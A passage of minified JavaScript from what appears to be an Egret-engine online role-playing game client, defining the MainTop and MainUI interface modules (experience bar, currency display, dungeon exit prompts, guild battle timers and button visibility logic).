__extends(e,t),e.prototype.dataChanged=function(){this.itemIcon.setIcon(this.data),this.count.text=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,this.data)+""},e}(n.BaseItemRender);e.MainPotTipItem=h,window.MainPotTipItem=h,__reflect(h.prototype,"MainPotTipItem",[]),window.MainPotTipItem=h},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainTop=void 0;var n=i(13),o=i(4),s=i(26),a=i(24),r=i(1),l=i(19),h=i(0),u=i(20),p=i(32),d=i(23),c=i(70),f=i(460),g=i(69),m=i(142),v=i(12),y=i(15),C=i(7),T=i(27),b=i(38),w=i(59),I=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layoutNum=LayoutNum.top,e.defaultRect=!1,e._sn_="maintopskin",e.lastLevel=0,e.flyExpLevel=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eVipBtn,this.onTap),this.addTouchEvent(this.eBtn0,this.onTap),this.addTouchEvent(this.eBtn1,this.onTap),this.addTouchEvent(this.eFace,this.onTap),this.addTouchEvent(this.eExpBtn,this.onTap)},e.prototype.addDisplay=function(){var t=o.ActorCC;this.lastLevel=o.ActorCC.level||0,observe(this,this.setName,t.postLevelChange),observe(this,this.setPower,t.postPowerChange),observe(this,this.updateSubRole,n.SubRoles.ins().doSubRole),observe(this,this.setMoney,t.postGoldChange,t.postYbChange),observe(this,this.setName,s.ZsCT.ins().postZsData),observe(this,this.expChange,o.ActorCC.postExp),observe(this,this.setExp,o.ActorCC.init),observe(this,this.flyExpToBar,p.FbCT.ins().postExpFly),observe(this,this.updateExpBtn,o.ActorCC.postLevelChange),observe(this,this.updateExpBtn,C.GameServerCC.postServerOpenDay),observe(this,this.updateExpBtn,m.OtherCT.ins().patchWorldLevel),observe(this,this.updateExpBtn,u.GameMap.postFbType),this.setMoney(),this.setName(),this.setPower(),this.updateSubRole(),this.setExp(),this.updateExpBtn(),this.changeBtn()},e.prototype.onTap=function(t){switch(t.currentTarget){case this.eVipBtn:if(u.GameMap.checkIsKf())return;var e=this.hasNoSave();e?T.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?",e),function(){b.EquipCT.ins().postChangeTabClear(),b.EquipCT.ins().changetabEquip(),win.open("RechargeShowWin")},this):win.open("RechargeShowWin");break;case this.eBtn0:if(window.platform.isshen())return;if(u.GameMap.checkIsKf())return;win.open("ExpGoldWin"),w.GameFlashSaleCt.ins().reportGolaNot();break;case this.eBtn1:if(window.platform.isshen())return;if(u.GameMap.checkIsKf())return;l.GlobalFun.openRechargeWin();break;case this.eFace:win.open("SettingView");break;case this.eExpBtn:win.open("ExpWorldWin")&&(window.mapopen=!window.mapopen);}},e.prototype.hasNoSave=function(){var t,e=b.EquipCT.ins().keepSacrifice;return e&&e.attArr.length>0&&(t=gettext("装备祭炼")),b.EquipCT.ins().extAttrs.length>0&&(t=gettext("洗练")),b.EquipCT.ins().isQuenching&&(t=gettext("淬炼")),b.EquipCT.ins().soulAttr.length>0&&(t=gettext("铸魂")),t},e.prototype.updateSubRole=function(){var t=n.SubRoles.ins().getSubRoleByIndex(0);this.eFace&&t&&(this.eFace.source="yuanhead"+t.job+t.sex)},e.prototype.setName=function(t){t=t||o.ActorCC.level;var e=s.ZsCT.ins().stage;if(s.ZsCT.ins().lv>=110){var i=Math.floor(Math.floor(s.ZsCT.ins().lv/11)/10),n=h.GlobalConfig.NewZhuanShengConfig[i];if(n){var a=s.ZsCT.ins().lv%110;this.eLv.text=n.zsNewName+gettext("{0}转{1}级",Math.floor(a/11),t)}}else{var r=e?gettext("{0}转",e):"";this.eLv.text=gettext("{0}{1}级",r,t)}this.eName.text=o.ActorCC.myName||""},e.prototype.setMoney=function(){this.eTxt0.text=(o.ActorCC.gold / 100000000).toFixed(3) + '亿',a.CommonUtils.labelIsOverLenght(this.eTxt1,o.ActorCC.yb)},e.prototype.setPower=function(){this.ePow.text=o.ActorCC.power+""},e.prototype.setExp=function(){var t;this.expBar.maximum=(null===(t=h.GlobalConfig.ExpConfig[o.ActorCC.level])||void 0===t?void 0:t.exp)||0,this.expBar.value=o.ActorCC.exp},e.prototype.expChange=function(t){var e=this;if(void 0===t&&(t=!1),t||u.GameMap.fbType!=p.FbCT.FB_TYPE_GUANQIABOSS){this.lastLevel||(this.lastLevel=o.ActorCC.level),this.flyExpLevel.length?(this.flyExpLevel[this.flyExpLevel.length-1][0]=o.ActorCC.level,this.flyExpLevel[this.flyExpLevel.length-1][1]=o.ActorCC.exp):this.flyExpLevel.push([o.ActorCC.level,o.ActorCC.exp]);var i=this.flyExpLevel[0][0],n=this.flyExpLevel[0][1];if(this.lastLevel<i){var s=h.GlobalConfig.ExpConfig[this.lastLevel].exp;egret.Tween.removeTweens(this.expBar);var a=egret.Tween.get(this.expBar);a.to({value:this.expBar.maximum},300).wait(100).call(function(){e.expBar.maximum=s,e.expBar.value=0,e.lastLevel+=1,d.GameLogic.ins().postLevelBarChange(e.lastLevel),g.SoundUtil.play(g.SoundEnum.LEVEL_UP),e.expChange()},this)}else{egret.Tween.removeTweens(this.expBar);var r=h.GlobalConfig.ExpConfig[i].exp;this.expBar.maximum!=r&&(this.expBar.maximum=r);var a=egret.Tween.get(this.expBar);a.to({value:n},400),this.flyExpLevel.shift()}}},e.prototype.flyExpToBar=function(t){for(var e=this,i=t[0],n=t[1],o=t[2],s=this.globalToLocal(i.x,i.y),a=this.expBar.x+this.expBar.width/2,r=this.expBar.y,l=new egret.Point(a,r),h=function(t){var i=egret.Point.interpolate(s,l,c.MathUtils.limit(.2,.8));i.x+=c.MathUtils.limitInteger(-100,100),i.y+=c.MathUtils.limitInteger(-100,100);var n=new eui.Image;n.source="point2",n.anchorOffsetX=20,n.anchorOffsetY=20,n.x=s.x,n.y=s.y,u.addChild(n);var a=f.Bezier.pop(s,l);a.display=n,a.centerPoint=i,a.start(1e3,function(){f.Bezier.push(a),e.removeChild(n),egret.Tween.removeTweens(n),t||e.expChange(!0)},u,t*o),egret.Tween.get(n).to({alpha:.5},1e3);var r=egret.Tween.get(n,{loop:!0});r.to({rotation:n.rotation+360},500)},u=this,p=0;n>p;p++)h(p)},e.prototype.updateExpBtn=function(){this.eExpBtn.visible=this.isExpWorldOpen()&&!u.GameMap.checkIsInGuildBattle()},e.prototype.isExpWorldOpen=function(){return v.OpenSystem.ins().checkSysOpen(y.SystemType.ExpWorld)?o.ActorCC.level>=m.OtherCT.ins().worldLevel?!1:!0:!1},e.prototype.changeBtn=function(){var t=!window.platform.isshen();this.eVipBtn.visible=t},e}(r.BaseView);e.MainTop=I,window.MainTop=I,__reflect(I.prototype,"MainTop",[]),window.MainTop=I},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainUI=void 0;var n=i(1),o=i(64),s=i(20),a=i(25),r=i(17),l=i(32),h=i(6),u=i(27),p=i(105),d=i(0),c=i(2),f=i(43),g=i(8),m=i(259),v=i(37),y=i(7),C=i(125),T=i(12),b=i(15),w=i(51),I=i(1082),_=i(47),S=i(35),x=i(166),D=i(463),A=i(465),k=(i(58),i(23)),B=i(237),P=i(466),R=i(190),E=i(75),G=i(467),M=i(233),L=i(79),F=i(468),O=i(68),N=i(19),W=i(9),U=i(469),H=i(83),q=i(109),j=i(470),V=i(143),Y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e.mainView=!0,e._sn_="mainuiskin",e.comAction=!1,e.startHour=0,e.startMinutes=0,e.minute=0,e.seconds=0,e.onClickCount=0,e.showImg=[],e.isSet=1,e.firstShowQiyu=!0,e}return __extends(e,t),e.prototype.addDisplay=function(){return this.addTouchEvent(this.bossMapBtn,this.onClick),this.addTouchEvent(this.bossExitBtn,this.onClick),this.addTouchEvent(this.campBtn,this.onClick),this.addTouchEvent(this.posBtn0,this.onClick),this.addTouchEvent(this.teamBtn,this.onClick),this.addTouchEvent(this.teamFbSee,this.onClick),this.addTouchEvent(this.guildWar,this.onClick),this.addTouchEvent(this.zhanchangBtn,this.onClick),this.addTouchEvent(this.roguebuff,this.onClick),observe(this,this.updateClickCount,o.MainUICC.onClickMap),observe(this,this.targetChange,m.TargetPanelCC.postTarget),observe(this,this.setTeamFbTime,l.FbCT.ins().postFbTime),observe(this,this.updateEnter,Ts.enterScene.enterOK),observe(this,this.updateRechBtn,a.Recharge.ins().getRecharge1WinInfo),observe(this,this.updateRechBtn,s.GameMap.postFbType),observe(this,this.showQiyu,S.TaskCT.ins().doQiyuInfo),observe(this,this.updateBtnRp,r.RedPointBaseSys.ins().RpChange),observe(this,this.updateBtnRp,O.CrossDartCarCT.ins().postRedChange),observe(this,this.updateBtnRp,q.HegemonyRedPoint.ins().postRedPoint),observe(this,this.updateLimitTimeInfo,h.BagCT.ins().postLimitTimeItem),observe(this,this.updateCamp,p.CampCC.selectMode,Ts.enterScene.enterOK),observe(this,this.updateTeamBtnRp,f.CityCC.ins().postChangeApplyList,f.CityCC.ins().doPostTeamPlayerInfo),observe(this,this.updateRogueGame,V.RogueCT.ins().updateCardData),this.observe(w.GuildBattleCT.ins().postGuildWarStarInfo,this.updateGuildBattleEnter),this.observe(_.KfArenaSys.ins().postOpenKfArena,this.updateKfArena3v3Enter),this.observe(w.GuildBattleCT.ins().postPointUpdate,this.updateGuildBattleGunXun),this.observe(_.KfArenaSys.ins().postShowFightPanel,this.show3v3FightPanel),this.observe(_.KfArenaSys.ins().postHideFightPanel,this.hideDominateFightPanel),observe(this,this.showKfArenaInfo,_.KfArenaSys.ins().postFbInfo1),observe(this,this.flusSKZJBossInfo,E.BurningDesertCT.ins().sceneBuffInfoBack),observe(this,this.uptateCardValue,W.Activity.ins().postActivityIsGetAwards),this.observe(y.GameServerCC.postServerOpenDay,this.flusWarEnter),this.observe(o.MainUICC.postPayfunChange,this.changeLeftListPos),this.cbImg.visible=!1,this.rounds.visible=!1,this.teamFbTime.text="",this.guildBattleGrp.visible=!1,this.txtGuildBattleGunXun.visible=!1,this.kfArenaFightWin.visible=!1,this.DominateWorldFightPanel.visible=!1,this.updateEnter(),this.updateRechBtn(),this.updateLimitTimeInfo(),this.updateCamp(),this.updateClickCount(),this.updateBtnRp(),o.MainUICC.setDevilOpenTime(),this.SetStartActionTime(20,20),this.SetActionBtn(),Timer.start(2e3,-1,this.updateTime,this),(s.GameMap.fbType==l.FbCT.FB_TEAM||s.GameMap.fbType==l.FbCT.FB_TYPE_9||s.GameMap.fbType==l.FbCT.FB_TYPE_FOREST||s.GameMap.fbType==l.FbCT.FB_TYPE_QIYU_BOSS||s.GameMap.fbType==l.FbCT.FB_TYPE_INVADE||s.GameMap.fbType==l.FbCT.FB_TYPE_CROSSDART||s.GameMap.fbType==l.FbCT.FB_TYPE_SOULS||s.GameMap.fbType==l.FbCT.FB_TYPE_HEGEMONY)&&l.FbCT.ins().curFbLeftTime>0&&this.setTeamFbTime([l.FbCT.ins().curFbID,l.FbCT.ins().curFbLeftTime]),this.updateGuildBattleEnter(),this.guildWar.visible=!1,this.updateKfArena3v3Enter(),this.updateBurningDesertFightInfo(),this.updateStardomainFightInfo(),this.leftList.itemRenderer=A.PayfunIcon,this.leftList.dataProvider=new D.PayfunArraColler(9,o.MainUICC.getShowicon(9)),this.changeLeftListPos(),this.topList.itemRenderer=A.PayfunIcon,this.topList.dataProvider=new D.PayfunArraColler(1,o.MainUICC.getShowicon(1)),O.CrossDartCarCT.ins().initActTimer(),void this.uptateCardValue()
},e.prototype.uptateCardValue=function(){if(urlParam.TikTokNumber&&urlParam.TikTokNumber>0){var t=d.GlobalConfig.DyGameCard[urlParam.TikTokNumber];t&&(N.GlobalFun.jumpLink2(null===t||void 0===t?void 0:t.jumpId),urlParam.TikTokNumber=0)}},e.prototype.changeLeftListPos=function(){var t=o.MainUICC.getShowicon(9);if(t&&0!=t.length){var e=t.length;1==e?this.leftListGrp.bottom=-210:2==e?this.leftListGrp.bottom=-110:3==e?this.leftListGrp.bottom=-10:e>3&&(this.leftListGrp.bottom=3)}},e.prototype.getQiyuBossRule=function(){var t;if(!this.leftList)return null;for(var e=(o.MainUICC.getShowicon(9),67),i=0;i<this.leftList.numElements;i++){var n=this.leftList.getElementAt(i),s=null===n||void 0===n?void 0:n.data;if((null===(t=null===s||void 0===s?void 0:s.cfg)||void 0===t?void 0:t.id)==e)return n}return null},e.prototype.flusSKZJBossInfo=function(){if(s.GameMap.checkIsInShiKongZhiJing()){var t=E.BurningDesertCT.ins().sceneBossReliveTime;if(0>=t||y.GameServerCC.serverTime>=g.DateUtils.formatMiniDateTime(t))return void(this._shiKongZhiJingFbReliveWin&&this.burnDesertRliveGrp.contains(this._shiKongZhiJingFbReliveWin)&&this.burnDesertRliveGrp.removeChild(this._shiKongZhiJingFbReliveWin));this._shiKongZhiJingFbReliveWin||(this._shiKongZhiJingFbReliveWin=new G.ShiKongZhiJingFbReliveWin),this.burnDesertRliveGrp.contains(this._shiKongZhiJingFbReliveWin)||this.burnDesertRliveGrp.addChild(this._shiKongZhiJingFbReliveWin),this._shiKongZhiJingFbReliveWin.flusInfo(t)}else this._shiKongZhiJingFbReliveWin&&this.burnDesertRliveGrp.contains(this._shiKongZhiJingFbReliveWin)&&this.burnDesertRliveGrp.removeChild(this._shiKongZhiJingFbReliveWin)},e.prototype.formatStr=function(t,e){var i=/\%s(\d+)\%/g;return!e||e.length<=0?t:(t.replace(i,t),t.replace(i,function(t,i,n,o){return e[i]}))},e.prototype.showKfArenaInfo=function(t){this.kfArenaFightWin.showTimeInfo()},e.prototype.show3v3FightPanel=function(t){this.kfArenaFightWin.visible=t,t&&_.KfArenaSys.ins().postShowMapCenter()},e.prototype.hideDominateFightPanel=function(){this.DominateWorldFightPanel.closeDominateFightUI()},e.prototype.updateEnter=function(){this.updateCityPanel(),this.updateAllBtn(),this.updateTeamFb(),this.targetChange(),this.updateGuildBattleEnter(),this.updateKfArena3v3Enter(),this.updateBurningDesertFightInfo(),this.updateSixBuffInfo(),this.updateStardomainFightInfo(),s.GameMap.fbType==l.FbCT.FB_TYPE_GUILD_WAR||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_ARENA||s.GameMap.fbType==l.FbCT.FB_TYPE_SHI_KONG_ZHI_JING||s.GameMap.fbType==l.FbCT.FB_TYPE_LIU_DAO_LUN_HUI||s.GameMap.fbType==l.FbCT.FB_TYPE_STARDOMAIN||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_DOMINATE?this.topList.visible=!1:this.topList.visible=!0;var t=d.GlobalConfig.ScenesConfig[s.GameMap.mapID];this.posBtn0.visible=1==(null===t||void 0===t?void 0:t.posBtn),this.flusWarEnter(),this.rogueWarEnter(),win.close(R.BurningDesertRoomView),win.get("ItemDetailedWin")&&win.close("ItemDetailedWin"),win.get("StardomainRoomView")&&win.close("StardomainRoomView")},e.prototype.flusWarEnter=function(){this.zhanchangBtn.visible=T.OpenSystem.ins().checkSysOpen(b.SystemType.KF_WAR_GROUND)&&!(s.GameMap.checkIsKf(!1)||s.GameMap.fbType==l.FbCT.FB_PVP||s.GameMap.fbType==l.FbCT.FB_TEAM||s.GameMap.fbType==l.FbCT.FB_TYPE_9||s.GameMap.fbType==l.FbCT.FB_TYPE_FOREST||s.GameMap.fbType==l.FbCT.FB_TYPE_QIYU_BOSS||s.GameMap.fbType==l.FbCT.FB_TYPE_LIU_DAO_LUN_HUI||s.GameMap.fbType==l.FbCT.FB_TYPE_SOULS||s.GameMap.fbType==l.FbCT.FB_TYPE_STARDOMAIN||s.GameMap.fbType==l.FbCT.FB_TYPE_LINGJING||s.GameMap.fbType==l.FbCT.FB_TYPE_ROGUE)},e.prototype.rogueWarEnter=function(){this.roguebuff.visible=s.GameMap.fbType==l.FbCT.FB_TYPE_ROGUE,this.rounds.visible=s.GameMap.fbType==l.FbCT.FB_TYPE_ROGUE},e.prototype.updateRogueGame=function(){var t,e;this.rounds.text=gettext("剩余波数：{0}/{1}",V.RogueCT.ins().mosterIdx,(null===(e=null===(t=null===d.GlobalConfig||void 0===d.GlobalConfig?void 0:d.GlobalConfig.OpenGameType1Cfg)||void 0===t?void 0:t.mon)||void 0===e?void 0:e.turn)||0)},e.prototype.targetChange=function(){this.targetBloodPanel.visible=m.TargetPanelCC.checkIsShow(v.EntityManager.ins().getEntityByHandle(m.TargetPanelCC.targetHandle))},e.prototype.updateBurningDesertFightInfo=function(){if(s.GameMap.fbType==l.FbCT.FB_TYPE_SHI_KONG_ZHI_JING){var t=d.GlobalConfig.InstanceConfig[s.GameMap.fubenID];0==t.camp?this.burningDescetGrp.contains(this._burningDesertFinghtWin)&&this.burningDescetGrp.removeChild(this._burningDesertFinghtWin):(this._burningDesertFinghtWin||(this._burningDesertFinghtWin=new P.BurningDesertFightView),this.burningDescetGrp.contains(this._burningDesertFinghtWin)||this.burningDescetGrp.addChild(this._burningDesertFinghtWin),E.BurningDesertCT.ins().postShowFightWin())}else this.burningDescetGrp.contains(this._burningDesertFinghtWin)&&this.burningDescetGrp.removeChild(this._burningDesertFinghtWin)},e.prototype.updateStardomainFightInfo=function(){if(s.GameMap.fbType==l.FbCT.FB_TYPE_STARDOMAIN){var t=d.GlobalConfig.InstanceConfig[s.GameMap.fubenID];0==t.camp?this.burningDescetGrp.contains(this._stardomainFinghtWin)&&this.burningDescetGrp.removeChild(this._stardomainFinghtWin):(this._stardomainFinghtWin||(this._stardomainFinghtWin=new U.StardomainFightView),this.burningDescetGrp.contains(this._stardomainFinghtWin)||this.burningDescetGrp.addChild(this._stardomainFinghtWin),H.StardomainCT.ins().postShowFightWin())}else this.burningDescetGrp.contains(this._stardomainFinghtWin)&&this.burningDescetGrp.removeChild(this._stardomainFinghtWin)},e.prototype.updateSixBuffInfo=function(){if(s.GameMap.fbType==l.FbCT.FB_TYPE_LIU_DAO_LUN_HUI){d.GlobalConfig.InstanceConfig[s.GameMap.fubenID];this._sixBuffWin||(this._sixBuffWin=new F.SixBuffWin),this.sixBuffGrp.contains(this._sixBuffWin)||this.sixBuffGrp.addChild(this._sixBuffWin),this._sixBuffWin.Open()}else for(;this.sixBuffGrp.numChildren>0;)this.sixBuffGrp.removeChildAt(0)},e.prototype.updateKfArena3v3Enter=function(){},e.prototype.updateKfArena3v3Time=function(){},e.prototype.updateGuildBattleEnter=function(){},e.prototype.updateGuildBattleTime=function(){},e.prototype.updateLimitTimeInfo=function(){var t=h.BagCT.ins().getLimitItemById(102005);!t||t.LastTime<=0?(this.limitItemTime.text="",this.limitItemTime.visible=!1):(this.limitItemTime.text=gettext("双倍经验: {0}",t.LastTimeStr),this.limitItemTime.visible=!0)},e.prototype.updateTeamFb=function(){if(s.GameMap.fbType!=l.FbCT.FB_TEAM)return void(this.teamFbGrp.visible=!1);this.teamFbGrp.visible=!0;var t;t=l.FbCT.ins().isNormal?d.GlobalConfig.TeamFuBenConfig[l.FbCT.ins().tfTeamID]:d.GlobalConfig.TeamFuBenExConfig[l.FbCT.ins().tfPurgatoryTeamID],this.teamFbIcon.source=null===t||void 0===t?void 0:t.nameImg},e.prototype.setTeamFbTime=function(t){return s.GameMap.fbType==l.FbCT.FB_TYPE_KF_DOMINATE?(this.DominateWorldFightPanel.visible=!0,void this.DominateWorldFightPanel.startCountDown()):(Timer.stop(this.updateTeamFbTime,this),s.GameMap.fbType==l.FbCT.FB_TYPE_GUANQIABOSS||s.GameMap.fbType==l.FbCT.FB_TYPE_CITY?void(this.teamFbTime.text=""):(this.updateTeamFbTime(),void Timer.start(1e3,0,this.updateTeamFbTime,this)))},e.prototype.updateGuildBattleGunXun=function(){this.txtGuildBattleGunXun.text=gettext("沙城功勋：")+w.GuildBattleCT.ins().getModel().gongXun},e.prototype.updateTeamFbTime=function(){if(s.GameMap.checkIsInGuildBattle()){var t=w.GuildBattleCT.ins().getModel().actLeftTime;if(this.teamFbTime.text=0>=t?"":gettext("剩余时间：")+g.DateUtils.getFormatBySecond(t,g.DateUtils.TIME_FORMAT_5,4),""!=w.GuildBattleCT.ins().getModel().flagGuild&&void 0!=w.GuildBattleCT.ins().getModel().flagGuild){this.guildBattleGrp.visible=!0;var e=w.GuildBattleCT.ins().getModel().endTime;this.txtHoldTime.text=g.DateUtils.getFormatBySecond(e,g.DateUtils.TIME_FORMAT_5,4),this.txtHoldGuildName.text=gettext("皇宫归属行会：")+w.GuildBattleCT.ins().getModel().flagGuild}else this.guildBattleGrp.visible=!1;if(0>=t)return this.teamFbTime.text="",this.guildBattleGrp.visible=!1,this.guildWar.visible=!1,this.txtGuildBattleGunXun.visible=!1,void Timer.stop(this.updateTeamFbTime,this);this.guildWar.visible=!0,this.txtGuildBattleGunXun.visible=!0}else{var i=(g.DateUtils.formatMiniDateTime(l.FbCT.ins().curFbLeftTime)-y.GameServerCC.serverTime)/1e3;if(this.teamFbTime.text=0>=i?"":gettext("过关倒计时 ")+g.DateUtils.getFormatBySecond(i,g.DateUtils.TIME_FORMAT_5,4),0>=i)return this.teamFbTime.text="",void Timer.stop(this.updateTeamFbTime,this);i--}},e.prototype.removeDisplay=function(){egret.Tween.removeTweens(this),Timer.stop(this.updateTime,this)},e.prototype.openBossMap=function(){return this.bossMapBtn.visible?(win.close("BagWin"),this.onClickCount++,void o.MainUICC.onClickMap(this.onClickCount%2!=0)):void c.TipsCT.ins().showTips(gettext("此场景无法打开该界面"))},e.prototype.onClick=function(t){switch(t.target){case this.bossMapBtn:this.onClickCount++,o.MainUICC.onClickMap(this.onClickCount%2!=0);break;case this.bossExitBtn:s.GameMap.fbType==l.FbCT.FB_KF?u.WarnWin.show(gettext("确认是否退出跨服?"),function(){send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_GUILD_WAR?u.WarnWin.show(gettext("确认是否退出沙城争霸?"),function(){send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_DEVILDOM_BOSS?u.WarnWin.show(40004==s.GameMap.fubenID?gettext("确认是否退出魔主入侵?"):gettext("确认是否退出魔界入侵?"),function(){send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TEAM?u.WarnWin.show(gettext("确认是否退出组队副本?"),function(){l.FbCT.ins().isNormal=!0,send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_KF_ARENA?u.WarnWin.show(gettext("确认是否退出跨服竞技?"),function(){send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_KF_DOMINATE?u.WarnWin.show(gettext("确认是否退出跨服称霸天下?"),function(){send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_SHI_KONG_ZHI_JING?u.WarnWin.show(gettext("确认是否退出时空之境副本?"),function(){send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_FOREST?u.WarnWin.show(gettext("确认是否退出幽冥森林副本?"),function(){send(Ts.exitFB),win.open("ForestWin")},this):s.GameMap.fbType==l.FbCT.FB_TYPE_QIYU_BOSS?u.WarnWin.show(gettext("确认是否退出奇遇boss副本?"),function(){send(Ts.exitFB);var t=S.TaskCT.ins().checkQiyuBossOpen();t&&win.open(M.QiyuBossWin)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_INVADE||s.GameMap.fbType==l.FbCT.FB_TYPE_SOULS?u.WarnWin.show(gettext("退出副本将无法获得奖励，确认退出吗?"),function(){send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_LIU_DAO_LUN_HUI?u.WarnWin.show(gettext("是否退出六道轮回副本?"),function(){L.SixReisCT.ins().clearInfo(),send(Ts.exitFB)},this):s.GameMap.fbType==l.FbCT.FB_TYPE_LINGJING?u.WarnWin.show(gettext("是否退出灵境探索副本?"),function(){send(Ts.exitFB),win.open("LingJingMainPanel")},this):s.GameMap.fbType==l.FbCT.FB_TYPE_ROGUE?u.WarnWin.show(gettext("是否退出肉鸽副本?"),function(){send(Ts.exitFB)},this):send(Ts.exitFB);break;case this.campBtn:if(s.GameMap.fbType==l.FbCT.FB_TYPE_GUILD_WAR)return void c.TipsCT.ins().showTips(gettext("沙城争霸中不可切换"));if(s.GameMap.fbType==l.FbCT.FB_TYPE_KF_ARENA)return void c.TipsCT.ins().showTips(gettext("跨服竞技中不可切换"));if(s.GameMap.fbType==l.FbCT.FB_TYPE_SHI_KONG_ZHI_JING)return void c.TipsCT.ins().showTips(gettext("时空之境副本中不可切换"));if(s.GameMap.fbType==l.FbCT.FB_TYPE_KF_DOMINATE)return void c.TipsCT.ins().showTips(gettext("称霸天下副本中不可切换"));this.campCom.visible=!0,this.campBtn.visible=!1;break;case this.teamBtn:if(s.GameMap.checkIsKf())return;win.open("TeamCityListWin");break;case this.teamFbSee:var e=void 0;e=l.FbCT.ins().isNormal?d.GlobalConfig.TeamFuBenConfig[l.FbCT.ins().tfTeamID]:d.GlobalConfig.TeamFuBenExConfig[l.FbCT.ins().tfPurgatoryTeamID],win.open("TeamFbGuideWin",e.id,l.FbCT.ins().isNormal);break;case this.guildWar:win.open(I["default"]);break;case this.posBtn0:k.GameLogic.ins().postShowCenter();break;case this.zhanchangBtn:if(s.GameMap.checkIsKf())return;if(!T.OpenSystem.ins().checkSysOpen(b.SystemType.KF_WAR_GROUND))return void c.TipsCT.ins().showTips(T.OpenSystem.ins().getNoOpenTips(b.SystemType.KF_WAR_GROUND));win.open(B.ZhanChangMainView);break;case this.roguebuff:win.open(j.RogueSkillListWin)}},e.prototype.updateBtnRp=function(){this.zhanchangBtn.eRp&&(this.zhanchangBtn.eRp.visible=O.CrossDartCarCT.ins().isOpening||q.HegemonyRedPoint.ins().redpoint>0)},e.prototype.updateTeamBtnRp=function(){this.teamBtn.sRp=!!f.CityCC.ins().teamApplyList.length},e.prototype.updateRechBtn=function(){this.leftList.visible=s.GameMap.fbType!=l.FbCT.FB_TYPE_CITY&&s.GameMap.fbType!=l.FbCT.FB_KF&&s.GameMap.fbType!=l.FbCT.FB_TYPE_GUILD_WAR&&!s.GameMap.checkIsInGuildBattle()&&!s.GameMap.checkIsInKf3v3()&&s.GameMap.fbType!=l.FbCT.FB_TYPE_SHI_KONG_ZHI_JING&&s.GameMap.fbType!=l.FbCT.FB_TYPE_DEVILDOM_BOSS&&s.GameMap.fbType!=l.FbCT.FB_TYPE_LIU_DAO_LUN_HUI&&s.GameMap.fbType!=l.FbCT.FB_TYPE_STARDOMAIN&&s.GameMap.fbType!=l.FbCT.FB_TYPE_ROGUE&&s.GameMap.fbType!=l.FbCT.FB_TYPE_KF_DOMINATE&&s.GameMap.fbType!=l.FbCT.FB_TYPE_CONTEST},e.prototype.showQiyu=function(){this.showTween(),this.updateQiyuBtn()},e.prototype.updateQiyuBtn=function(){},e.prototype.updateClickCount=function(t){void 0===t&&(t=!1),this.onClickCount=o.MainUICC.mainBossShow?1:0},e.prototype.updateCityPanel=function(){this.mainCityWin.visible=s.GameMap.fbType==l.FbCT.FB_TYPE_CITY},e.prototype.updateAllBtn=function(){this.bossExitBtn.visible=s.GameMap.fbType==l.FbCT.FB_KF||s.GameMap.fbType==l.FbCT.FB_TYPE_DEVILDOM_BOSS||s.GameMap.fbType==l.FbCT.FB_TYPE_9||s.GameMap.fbType==l.FbCT.FB_TEAM||s.GameMap.fbType==l.FbCT.FB_TYPE_GUILD_WAR||s.GameMap.fbType==l.FbCT.FB_TYPE_GUILD_WAR||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_ARENA||s.GameMap.fbType==l.FbCT.FB_TYPE_SHI_KONG_ZHI_JING||s.GameMap.fbType==l.FbCT.FB_TYPE_FOREST||s.GameMap.fbType==l.FbCT.FB_TYPE_QIYU_BOSS||s.GameMap.fbType==l.FbCT.FB_TYPE_INVADE||s.GameMap.fbType==l.FbCT.FB_TYPE_LIU_DAO_LUN_HUI||s.GameMap.fbType==l.FbCT.FB_TYPE_SOULS||s.GameMap.fbType==l.FbCT.FB_TYPE_STARDOMAIN||s.GameMap.fbType==l.FbCT.FB_TYPE_LINGJING||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_DOMINATE||s.GameMap.fbType==l.FbCT.FB_TYPE_ROGUE,this.bossMapBtn.visible=!this.bossExitBtn.visible,this.teamBtn.visible=!(s.GameMap.fbType==l.FbCT.FB_PVP||s.GameMap.fbType==l.FbCT.FB_TEAM||s.GameMap.fbType==l.FbCT.FB_TYPE_GUILD_WAR||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_ARENA||s.GameMap.fbType==l.FbCT.FB_TYPE_SHI_KONG_ZHI_JING||s.GameMap.fbType==l.FbCT.FB_TYPE_LIU_DAO_LUN_HUI||s.GameMap.fbType==l.FbCT.FB_TYPE_KF_DOMINATE),this.updateRechBtn(),this.updateQiyuBtn()},e.prototype.updateCamp=function(t){return 